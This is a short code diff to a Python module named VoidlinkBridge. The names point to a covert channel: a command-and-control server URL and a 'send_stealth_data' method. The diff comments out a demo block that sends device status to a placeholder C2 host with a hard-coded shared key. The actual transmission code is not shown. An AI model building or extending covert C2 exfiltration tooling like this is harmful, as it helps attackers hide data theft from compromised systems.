@@ -1,3 +1,5 @@
+# modules/bridges/voidlink_bridge.py
+import os
 import json
 import logging
 import base64
@@ -43,7 +45,7 @@ class VoidlinkBridge:
             logger.error(f"Error in stealth transmission: {e}")
             return False
 
-if __name__ == "__main__":
-    bridge = VoidlinkBridge(c2_url="http://c2-server", shared_key="secret-key")
-    device_status = {"cpu": 20, "mem": 45, "status": "active"}
-    bridge.send_stealth_data(device_status)
+# if __name__ == "__main__":
+#     bridge = VoidlinkBridge(c2_url="http://c2-server", shared_key="secret-key")
+#     device_status = {"cpu": 20, "mem": 45, "status": "active"}
+#     bridge.send_stealth_data(device_status)
